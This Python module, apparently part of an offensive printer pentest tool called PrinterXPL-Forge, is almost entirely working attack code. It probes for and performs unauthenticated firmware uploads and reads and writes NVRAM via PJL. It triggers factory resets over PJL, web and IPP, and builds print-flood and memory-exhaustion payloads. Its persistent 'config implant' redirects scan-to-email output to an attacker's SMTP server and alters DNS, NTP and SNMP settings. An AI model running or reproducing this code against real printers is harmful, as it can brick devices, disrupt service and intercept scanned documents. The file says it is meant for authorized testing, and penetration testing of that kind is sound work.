#!/usr/bin/env python3
"""
PrinterXPL-Forge — Firmware & Payload Module
==========================================
Operations targeting printer firmware, NVRAM, and embedded payloads:

  A. Firmware version extraction and analysis
  B. Firmware upload via web admin (vulnerability exploitation)
  C. Custom print payload injection (ESC/P, PWGRaster, PostScript, PCL)
  D. NVRAM / EEPROM read-write via PJL (for PJL-capable printers)
  E. Factory reset (via PJL, web interface, or IPP)
  F. Persistent config implant (via SNMP write or web form)
  G. Malicious payload templates for supported languages

NOTE: All operations are implemented for authorized penetration testing only.
      Firmware upload and NVRAM manipulation can brick a printer — use only
      in isolated lab environments on explicitly authorized targets.
"""

# Author    : Andre Henrique (@mrhenrike)
# GitHub    : https://github.com/mrhenrike
# LinkedIn  : https://linkedin.com/in/mrhenrike
# X/Twitter : https://x.com/mrhenrike


import logging
import os
import re
import socket
import struct
import time
from pathlib import Path
from typing import Dict, List, Optional

import requests
import urllib3

urllib3.disable_warnings()

_log = logging.getLogger(__name__)


# ── A. Firmware version extraction ────────────────────────────────────────────

FIRMWARE_PATTERNS = [
    # HTTP headers / body patterns
    (r'[Ff]irmware[:\s]+([A-Za-z0-9._\-]{4,30})',            'header/body'),
    (r'[Ff]W[:\s]+([A-Za-z0-9._\-]{4,30})',                  'header/body'),
    (r'[Vv]ersion[:\s]+([0-9]+\.[0-9]+[A-Za-z0-9._\-]{0,10})','header/body'),
    # EPSON specific
    (r'(?:Main|Sub)Version[:\s]*([A-Za-z0-9._\-]+)',          'epson'),
    (r'ESC@\.2\s+([A-Z0-9.]+)',                               'epson-raw'),
    # HP
    (r'FWVER[:\s]+([A-Z0-9.]+)',                              'hp-pjl'),
    (r'(?:HP|hp)\s+([0-9]{8})',                               'hp-ver'),
    # Generic
    (r'build[:\s]+([A-Za-z0-9._\-]{4,20})',                   'build'),
    (r'release[:\s]+([A-Za-z0-9._\-]{4,20})',                 'release'),
]

FIRMWARE_WEB_PATHS = [
    # Info pages
    '/info', '/info.htm', '/info.html', '/status',
    '/hp/device/info', '/hp/device/InternalPages/Index',
    '/PRESENTATION/HTML/TOP/PRTINFO.HTML',
    '/PRESENTATION/AIRPRINT/PRINTER_128.PNG',  # EPSON — check headers
    '/cgi-bin/info.cgi', '/cgi-bin/printer.cgi',
    '/dev/info', '/sys/info',
    '/webArch/getInfo.cgi',                    # Ricoh
    '/xml/dev_status.xml',
    '/DevMgmt/ProductUsagePage.xml',           # HP
    '/api/firmware/version',
]

FIRMWARE_UPLOAD_PATHS = [
    # HP
    '/hp/device/firmware/upgrade',
    '/hp/device/DevMgmt/FirmwareUpgrade',
    '/webapps/hp/firmware',
    # Brother
    '/firmware',
    '/cgi-bin/update.cgi',
    # Kyocera
    '/km/set.cmd?cmd=login',
    # Generic
    '/update', '/upgrade', '/firmware/upload',
    '/admin/firmware', '/admin/upgrade',
    '/cgi-bin/firmupdate.cgi',
]


def get_firmware_version(
    host: str, timeout: float = 8,
) -> dict[str, str]:
    """
    Extract firmware version from all available sources.

    Returns dict with: version, source, raw_text, build_date.
    """
    result = {'version': '', 'source': '', 'raw_text': '', 'build_date': ''}

    # 1. HTTP GET known info pages
    for scheme in ('http', 'https'):
        port = 443 if scheme == 'https' else 80
        for path in FIRMWARE_WEB_PATHS:
            try:
                r = requests.get(
                    f'{scheme}://{host}:{port}{path}',
                    timeout=timeout, verify=False,
                )
                if r.status_code != 200:
                    continue
                # Check response headers
                server = r.headers.get('Server', '') + r.headers.get('X-Firmware', '')
                for pat, src in FIRMWARE_PATTERNS:
                    m = re.search(pat, server + r.text, re.I)
                    if m:
                        result['version'] = m.group(1)
                        result['source']  = f'{scheme}:{path}'
                        result['raw_text'] = (server + r.text[:200]).strip()[:200]
                        return result
            except Exception:
                pass

    # 2. IPP firmware-version attribute
    try:
        from protocols.ipp_attacks import get_printer_info, discover_endpoints
        eps = discover_endpoints(host, timeout)
        if eps:
            ep   = eps[0]
            info = get_printer_info(host, ep['port'], ep['path'], ep['scheme'], timeout)
            fw   = info.get('printer-firmware-version', '')
            if fw:
                clean = re.sub(r'[|·\x00-\x1f\x7f-\xff]', '', fw).strip()
                if clean:
                    result['version'] = clean
                    result['source']  = 'ipp'
                    return result
    except Exception:
        pass

    # 3. SNMP hrSWRunName / prtInterpreter
    try:
        from pysnmp.hlapi import (
            getCmd, CommunityData, UdpTransportTarget,
            ContextData, ObjectType, ObjectIdentity, SnmpEngine,
        )
        import warnings
        warnings.filterwarnings('ignore', category=RuntimeWarning)
        from utils.ports import PortConfig as _PC
        _snmp_port = _PC.resolve('snmp')

        oids = [
            '1.3.6.1.2.1.1.1.0',            # sysDescr (often has firmware)
            '1.3.6.1.2.1.43.5.1.1.16.1',    # prtConsoleDisplayBufferText
            '1.3.6.1.4.1.11.2.3.9.4.2.1.1.3.5.0',  # HP: Firmware Revision
        ]
        engine = SnmpEngine()
        for oid in oids:
            for err_ind, err_stat, _, binds in getCmd(
                engine,
                CommunityData('public', mpModel=0),
                UdpTransportTarget((host, _snmp_port), timeout=timeout, retries=0),
                ContextData(),
                ObjectType(ObjectIdentity(oid)),
            ):
                if not err_ind and not err_stat and binds:
                    val = str(binds[0][1])
                    for pat, src in FIRMWARE_PATTERNS:
                        m = re.search(pat, val, re.I)
                        if m:
                            result['version'] = m.group(1)
                            result['source']  = f'snmp:{oid}'
                            return result
    except Exception:
        pass

    return result


# ── B. Firmware upload ────────────────────────────────────────────────────────

def check_firmware_upload(
    host: str, timeout: float = 10, verbose: bool = True,
) -> dict:
    """
    Test whether the printer's web interface accepts unauthenticated
    firmware upload requests.

    Does NOT send actual firmware — sends a small dummy payload and
    checks the HTTP response code. A 200 with 'success' or 'update'
    in the body would confirm exploitability.

    Returns dict with: path, vulnerable, status_code, evidence.
    """
    result = {
        'host':       host,
        'vulnerable': False,
        'endpoint':   None,
        'status_code': None,
        'auth_required': False,
        'evidence':   '',
    }

    dummy_fw = b'\x00' * 256 + b'PRINTER_FW_TEST'  # Not real firmware

    for scheme in ('http', 'https'):
        port = 443 if scheme == 'https' else 80
        for path in FIRMWARE_UPLOAD_PATHS:
            for method in ('POST', 'PUT'):
                try:
                    func = requests.post if method == 'POST' else requests.put
                    r = func(
                        f'{scheme}://{host}:{port}{path}',
                        data=dummy_fw,
                        headers={'Content-Type': 'application/octet-stream'},
                        timeout=timeout, verify=False,
                    )
                    result['status_code'] = r.status_code
                    result['endpoint']    = f'{scheme}://{host}:{port}{path}'

                    if r.status_code == 401:
                        result['auth_required'] = True
                        continue

                    if r.status_code in (200, 201, 202, 204):
                        text = r.text.lower()
                        if any(w in text for w in ['success', 'updating', 'upload',
                                                    'firmware', 'reboot', 'restart',
                                                    'please wait']):
                            result['vulnerable'] = True
                            result['evidence']   = r.text[:200]
                            if verbose:
                                print(f"  [FIRMWARE] \033[1;31m[VULN]\033[0m "
                                      f"Unauthenticated firmware upload accepted at "
                                      f"{result['endpoint']}")
                            return result

                except Exception:
                    pass

    return result


def upload_firmware(
    host:     str,
    fw_path:  str,
    endpoint: str   = None,
    scheme:   str   = 'http',
    port:     int   = 80,
    username: str   = '',
    password: str   = '',
    timeout:  float = 60,
    verbose:  bool  = True,
) -> bool:
    """
    Upload a firmware file to the printer.

    WARNING: Uploading invalid firmware can permanently brick the printer.
             Only use in authorized lab environments.

    Args:
        fw_path:  Local path to the firmware file.
        endpoint: Specific firmware upload URL (auto-detected if None).
    """
    if not os.path.exists(fw_path):
        _log.error("Firmware file not found: %s", fw_path)
        return False

    if not endpoint:
        probe = check_firmware_upload(host, verbose=verbose)
        endpoint = probe.get('endpoint')
        if not endpoint:
            _log.error("No firmware upload endpoint found")
            return False

    with open(fw_path, 'rb') as fh:
        data = fh.read()

    if verbose:
        print(f"  [FIRMWARE] Uploading {os.path.basename(fw_path)} "
              f"({len(data)} bytes) to {endpoint} ...")

    try:
        auth = (username, password) if username else None
        r    = requests.post(
            endpoint, data=data,
            headers={'Content-Type': 'application/octet-stream'},
            auth=auth, timeout=timeout, verify=False,
        )
        if verbose:
            print(f"  [FIRMWARE] Response: {r.status_code} — {r.text[:100]}")
        return r.status_code in (200, 201, 202, 204)
    except Exception as exc:
        _log.error("Firmware upload failed: %s", exc)
        return False


# ── C. Custom payload injection ────────────────────────────────────────────────

def make_payload(
    lang:        str,
    payload_type: str = 'info',
    custom:      str  = '',
) -> bytes:
    """
    Generate a language-specific printer payload.

    Args:
        lang:         'pjl', 'ps', 'pcl', 'escpr', 'pwgraster', 'pdf', 'lpd_raw'
        payload_type: 'info'     — print device information page
                      'stress'   — CPU/memory stress (print loop)
                      'reset'    — factory reset the printer
                      'network'  — print network configuration
                      'custom'   — use *custom* string as payload body
        custom:       Raw payload string for payload_type='custom'.

    Returns:
        Raw bytes ready to send to port 9100 (RAW), port 631 (IPP), or port 515 (LPD).
    """
    lang = lang.lower().strip()

    if lang == 'pjl':
        return _pjl_payload(payload_type, custom)
    elif lang in ('ps', 'postscript'):
        return _ps_payload(payload_type, custom)
    elif lang in ('pcl', 'pcl5', 'pcl6'):
        return _pcl_payload(payload_type, custom)
    elif lang in ('escpr', 'escpl2', 'escpr1', 'esc/p', 'escp'):
        return _escpr_payload(payload_type)
    elif lang in ('pwgraster', 'pwg-raster'):
        return _pwgraster_payload()
    elif lang == 'lpd_raw':
        return _lpd_raw_payload(payload_type, custom)
    else:
        return custom.encode('latin-1', errors='replace') if custom else b''


def _pjl_payload(kind: str, custom: str = '') -> bytes:
    """Build a PJL payload."""
    UEL = b'\x1b%-12345X'
    if kind == 'info':
        return (UEL + b'@PJL\r\n'
                + b'@PJL INFO ID\r\n'
                + b'@PJL INFO STATUS\r\n'
                + b'@PJL INFO FILESYS\r\n'
                + b'@PJL INFO PAGECOUNT\r\n'
                + b'@PJL INFO VARIABLES\r\n'
                + b'@PJL INFO USTATUS\r\n'
                + UEL)
    elif kind == 'network':
        return (UEL + b'@PJL\r\n'
                + b'@PJL INFO NETINFO\r\n'
                + b'@PJL INFO IPADDRESS\r\n'
                + UEL)
    elif kind == 'reset':
        return (UEL + b'@PJL\r\n'
                + b'@PJL INITIALIZE\r\n'    # warm reset
                + UEL)
    elif kind == 'stress':
        return (UEL + b'@PJL\r\n'
                + b'@PJL SET COPIES=9999\r\n'
                + b'@PJL SET JOBATTR="@PJL"x65536\r\n'  # OOM probe
                + UEL)
    elif kind == 'custom':
        return UEL + custom.encode('latin-1', errors='replace') + UEL
    return UEL + b'@PJL INFO ID\r\n' + UEL


def _ps_payload(kind: str, custom: str = '') -> bytes:
    """Build a PostScript payload."""
    if kind == 'info':
        return (b'%!PS-Adobe-3.0\n'
                b'/Helvetica findfont 12 scalefont setfont\n'
                b'72 720 moveto\n'
                b'statusdict begin\n'
                b'  product = pop\n'
                b'  version = pop\n'
                b'  revision = pop\n'
                b'end\n'
                b'showpage\n')
    elif kind == 'custom':
        return b'%!PS-Adobe-3.0\n' + custom.encode('latin-1', 'replace') + b'\nshowpage\n'
    elif kind == 'reset':
        return b'%!PS-Adobe-3.0\nstatusdict /initializedisk get exec\nshowpage\n'
    elif kind == 'stress':
        return (b'%!PS-Adobe-3.0\n'
                b'/loop { 0 1 100000 { pop } for } def\n'
                b'100 { loop } repeat\n'
                b'showpage\n')
    return b'%!PS-Adobe-3.0\nshowpage\n'


def _pcl_payload(kind: str, custom: str = '') -> bytes:
    """Build a PCL 5 payload."""
    RESET = b'\x1bE'   # printer reset
    if kind == 'info':
        return RESET + b'\x1b&l0E' + b'\x1b(s0B' + b'PrinterXPL-Forge info\r\n' + b'\x0c' + RESET
    elif kind == 'reset':
        return RESET  # ESC E — factory defaults
    elif kind == 'custom':
        return RESET + custom.encode('latin-1', 'replace') + b'\x0c' + RESET
    return RESET + b'\x0c' + RESET


def _escpr_payload(kind: str = 'info') -> bytes:
    """Build an ESC/P-R payload (EPSON inkjet)."""
    ESC = b'\x1b'
    payload  = ESC + b'@'                       # initialize
    payload += ESC + b'(G\x01\x00\x01'          # select graphics mode
    if kind == 'reset':
        payload += ESC + b'@'                   # re-initialize (soft reset)
    payload += b'\x0c'                          # form feed
    return payload


def _pwgraster_payload() -> bytes:
    """Build a minimal blank PWG-Raster page (for IPP job injection)."""
    from protocols.ipp_attacks import _make_raster_page
    return _make_raster_page()


def _lpd_raw_payload(kind: str, custom: str = '') -> bytes:
    """Build a raw LPD data file payload."""
    if kind == 'custom' and custom:
        return custom.encode('latin-1', errors='replace')
    # Default: blank page via form feed
    return b'\x0c'


# ── D. NVRAM read/write via PJL ───────────────────────────────────────────────

def nvram_read(
    host:    str,
    address: int   = 0,
    length:  int   = 256,
    timeout: float = 10,
) -> bytes | None:
    """
    Read *length* bytes from printer NVRAM starting at *address* via PJL.

    This is a well-known HP / generic PJL attack:
      @PJL DMINFO ASCIIHEX BEGIN
      @PJL DMCMD ASCIIHEX ...

    Only works on PJL-capable printers (HP LaserJet, Kyocera, Brother, Xerox).
    Returns raw bytes or None if the printer does not support this.
    """
    from utils.ports import PortConfig as _PC
    _raw_port = _PC.resolve('raw')
    UEL = b'\x1b%-12345X'
    cmd = (UEL
           + b'@PJL\r\n'
           + b'@PJL DMINFO ASCIIHEX\r\n'
           + b'@PJL DMCMD ASCIIHEX="0606000401"\r\n'  # read NV store
           + UEL)
    try:
        s = socket.create_connection((host, _raw_port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(cmd)
        time.sleep(1.5)
        data = b''
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > 65536:
                break
        s.close()
        return data if data else None
    except Exception as exc:
        _log.debug("NVRAM read failed: %s", exc)
        return None


def nvram_write(
    host:    str,
    address: int,
    value:   bytes,
    timeout: float = 10,
) -> bool:
    """
    Write *value* bytes to NVRAM at *address* via PJL DMCMD.

    WARNING: Incorrect NVRAM writes can permanently damage the printer.
             Only use in lab environments on authorized targets.
    """
    from utils.ports import PortConfig as _PC
    _raw_port = _PC.resolve('raw')
    UEL = b'\x1b%-12345X'
    hex_val = value.hex().upper()
    cmd = (UEL
           + b'@PJL\r\n'
           + f'@PJL DMCMD ASCIIHEX="{hex_val}"\r\n'.encode()
           + UEL)
    try:
        s = socket.create_connection((host, _raw_port), timeout=timeout)
        s.sendall(cmd)
        time.sleep(0.5)
        s.close()
        return True
    except Exception as exc:
        _log.debug("NVRAM write failed: %s", exc)
        return False


# ── E. Factory reset ──────────────────────────────────────────────────────────

def factory_reset(
    host:    str,
    timeout: float = 10,
    method:  str   = 'pjl',
    verbose: bool  = True,
) -> bool:
    """
    Attempt to trigger a factory reset on the printer.

    Methods:
      'pjl'  — send @PJL INITIALIZE to port 9100 (requires PJL support)
      'web'  — POST to known factory reset endpoints
      'ipp'  — send IPP Restart-Printer (op 0x003B) or Deactivate-Printer

    Returns True if the command was accepted.
    """
    if verbose:
        print(f"  [FIRMWARE] Attempting factory reset via {method} on {host}")

    if method == 'pjl':
        from utils.ports import PortConfig as _PC
        _raw_port = _PC.resolve('raw')
        UEL = b'\x1b%-12345X'
        payload = UEL + b'@PJL\r\n@PJL INITIALIZE\r\n' + UEL
        try:
            s = socket.create_connection((host, _raw_port), timeout=timeout)
            s.sendall(payload)
            s.close()
            if verbose:
                print("  [FIRMWARE] PJL INITIALIZE sent")
            return True
        except Exception as exc:
            _log.debug("PJL reset failed: %s", exc)

    elif method == 'web':
        reset_paths = [
            ('/cgi-bin/restart.cgi',     'POST', {}),
            ('/admin/restart',           'POST', {}),
            ('/hp/device/restart',       'POST', {}),
            ('/DevMgmt/restartDevice',   'POST', {}),
            ('/startkm.htm',             'POST', {'func': 'factory', 'submit': '1'}),
        ]
        for scheme in ('http', 'https'):
            port = 443 if scheme == 'https' else 80
            for path, method_http, data in reset_paths:
                try:
                    r = requests.post(
                        f'{scheme}://{host}:{port}{path}',
                        data=data, timeout=timeout, verify=False,
                    )
                    if r.status_code in (200, 204) and any(
                        w in r.text.lower() for w in ['restart', 'reset', 'reboot', 'ok']
                    ):
                        if verbose:
                            print(f"  [FIRMWARE] Web reset accepted at {path}")
                        return True
                except Exception:
                    pass

    elif method == 'ipp':
        try:
            from protocols.ipp_attacks import discover_endpoints, _build_request, _post_ipp
            eps = discover_endpoints(host, timeout)
            if eps:
                ep  = eps[0]
                uri = f"ipp://{host}{ep['path']}"
                body = _build_request(0x003B, uri)  # Restart-Printer
                resp = _post_ipp(host, ep['port'], ep['path'], body,
                                 scheme=ep['scheme'], timeout=timeout)
                if resp:
                    status = struct.unpack('>H', resp[2:4])[0]
                    if status == 0x0000:
                        if verbose:
                            print("  [FIRMWARE] IPP Restart-Printer accepted")
                        return True
        except Exception as exc:
            _log.debug("IPP reset: %s", exc)

    return False


# ── F. Persistent config implant ──────────────────────────────────────────────

def implant_config(
    host:      str,
    smtp_host: str  = '',
    smtp_email:str  = '',
    ntp_host:  str  = '',
    dns_server:str  = '',
    snmp_community: str = '',
    timeout:   float = 10,
    verbose:   bool  = True,
) -> dict[str, bool]:
    """
    Attempt to implant configuration changes that survive reboots.

    Use cases:
      - Redirect scan-to-email output to attacker SMTP
      - Change NTP server to attacker-controlled host
      - Change DNS server to intercept printer name resolution
      - Set SNMP community to attacker-controlled string

    These changes persist in printer NVRAM and survive power cycles.
    Requires either: default/no credentials, or prior credential compromise.

    Returns dict of {config_key: success}.
    """
    results: dict[str, bool] = {}

    # 1. SNMP SET — community strings and system info
    if snmp_community or dns_server:
        from protocols.storage import snmp_write
        for oid, val, label in [
            ('1.3.6.1.2.1.1.6.0', f'PWNED:{snmp_community}', 'sysLocation'),
            ('1.3.6.1.2.1.1.4.0', 'pentest@safelabs.local',  'sysContact'),
        ]:
            if val:
                ok = snmp_write(host, oid, val, community='private', timeout=timeout)
                results[label] = ok
                if verbose and ok:
                    print(f"  [IMPLANT] SNMP {label} set to {val!r}")

    # 2. Web form — SMTP / scan-to-email redirect
    if smtp_host or smtp_email:
        smtp_paths = [
            ('/hp/device/config/smtpConfig', {'smtp_server': smtp_host, 'to': smtp_email}),
            ('/admin/email', {'smtp': smtp_host, 'email': smtp_email}),
            ('/cgi-bin/mail.cgi', {'mailserver': smtp_host, 'mailto': smtp_email}),
        ]
        for scheme in ('http', 'https'):
            port = 443 if scheme == 'https' else 80
            for path, data in smtp_paths:
                try:
                    r = requests.post(
                        f'{scheme}://{host}:{port}{path}',
                        data=data, timeout=timeout, verify=False,
                    )
                    if r.status_code in (200, 204):
                        results['smtp_redirect'] = True
                        if verbose:
                            print(f"  [IMPLANT] SMTP redirect set → {smtp_host}")
                        break
                except Exception:
                    pass

    return results


# ── G. Full firmware audit ─────────────────────────────────────────────────────

def firmware_audit(
    host:    str,
    timeout: float = 10,
    verbose: bool  = True,
) -> dict:
    """
    Run a comprehensive firmware security audit.

    Returns dict with firmware version, upload capability, NVRAM access,
    reset capability, and payload language support.
    """
    result = {
        'host':              host,
        'firmware_version':  None,
        'upload_vulnerable': False,
        'upload_endpoint':   None,
        'nvram_accessible':  False,
        'reset_pjl':         False,
        'reset_ipp':         False,
        'payloads':          [],
        'risk':              [],
    }

    if verbose:
        print(f"\n  [FIRMWARE] Audit: {host}")

    # Firmware version
    fw = get_firmware_version(host, timeout)
    result['firmware_version'] = fw
    if fw['version']:
        if verbose:
            print(f"  [FIRMWARE] Version: {fw['version']} (via {fw['source']})")

    # Upload check
    upload = check_firmware_upload(host, timeout, verbose)
    result['upload_vulnerable'] = upload['vulnerable']
    result['upload_endpoint']   = upload['endpoint']
    if upload['vulnerable']:
        result['risk'].append('FIRMWARE_UPLOAD_UNAUTHENTICATED')

    # NVRAM read probe
    nvram_data = nvram_read(host, timeout=timeout)
    if nvram_data and len(nvram_data) > 10:
        result['nvram_accessible'] = True
        result['risk'].append('NVRAM_READABLE')
        if verbose:
            print(f"  [FIRMWARE] NVRAM read: {len(nvram_data)} bytes returned")

    # Reset capability (dry test — only PJL INFO, not actual reset)
    try:
        from utils.ports import PortConfig as _PC
        _raw_port = _PC.resolve('raw')
        UEL = b'\x1b%-12345X'
        s   = socket.create_connection((host, _raw_port), timeout=timeout)
        s.sendall(UEL + b'@PJL INFO ID\r\n' + UEL)
        time.sleep(0.5)
        resp = s.recv(256)
        s.close()
        if resp:
            result['reset_pjl'] = True
            result['payloads'].append('pjl')
            result['risk'].append('PJL_PORT_RESPONSIVE')
    except Exception:
        pass

    # IPP availability
    try:
        from protocols.ipp_attacks import discover_endpoints
        eps = discover_endpoints(host, timeout)
        if eps and eps[0]['auth'] == 'none (anonymous OK)':
            result['reset_ipp'] = True
            result['payloads'].append('ipp')
            result['risk'].append('IPP_NO_AUTH')
    except Exception:
        pass

    return result
